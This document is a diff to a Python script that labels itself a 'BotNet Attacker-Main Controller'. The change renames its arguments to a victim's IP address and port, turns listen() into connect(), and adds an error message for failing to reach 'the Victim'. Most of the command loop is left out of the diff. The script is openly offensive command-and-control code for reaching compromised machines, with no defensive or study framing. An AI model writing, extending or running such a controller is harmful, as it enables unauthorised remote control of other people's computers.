@@ -3,8 +3,8 @@ from colorama import Fore,init
 from colorama import Back as bg
 from multiprocessing import Process
 parser = argparse.ArgumentParser(description='BotNet Attacker-Main Controller')
-parser.add_argument('-ip','--attackerip',metavar='',help='')
-parser.add_argument('-p','--port',metavar='',help='')
+parser.add_argument('-ip','--victims_ip',metavar='',help='Enter Ip Address Of Victim/s')
+parser.add_argument('-p','--victims_port',metavar='',help='Enter The Victim/s Port')
 args = parser.parse_args()
 init(autoreset=True)
 class Controller(object):
@@ -25,19 +25,23 @@ class Controller(object):
         print('-----------------------------------------------------------------')
 
 
-    def listen(self):
+    def connect(self):
         try:
             server_ip = self.ip
             server_port = self.port
             buffer_values = lambda buff1,buff2 : buff1 * buff2
             buffer_size = buffer_values(10240,1024)
             SEPARATOR = "<sep>"
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((server_ip,int(server_port)))
-            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]checking connection...")
-            time.sleep(1)
-            print(f"connecting to {server_ip}:{server_port}...")
-            print('connected!\n')
+            try:
+             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+             s.connect((server_ip,int(server_port)))
+             print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]checking connection...")
+             time.sleep(1)
+             print(f"connecting to {server_ip}:{server_port}...")
+             print('connected!\n')
+            except:
+             print("Error Cant Connect To The Victim!\nInvalid Address or Port!")
+             exit()
             while True:
                 try:
                     host = socket.gethostname()
@@ -67,7 +71,7 @@ class Controller(object):
 
 
 if __name__ == "__main__":
-    main_class = Controller(args.attackerip,args.port)
+    main_class = Controller(args.victims_ip,args.victims_port)
     banner = Process(target=main_class.show_banner,args=('''
      _,-ddd888888bbb-._
    d88888888888888888888b     
@@ -85,4 +89,4 @@ if __name__ == "__main__":
     ''',)) 
     banner.start()
     banner.join()
-    main_class.listen()
+    main_class.connect()
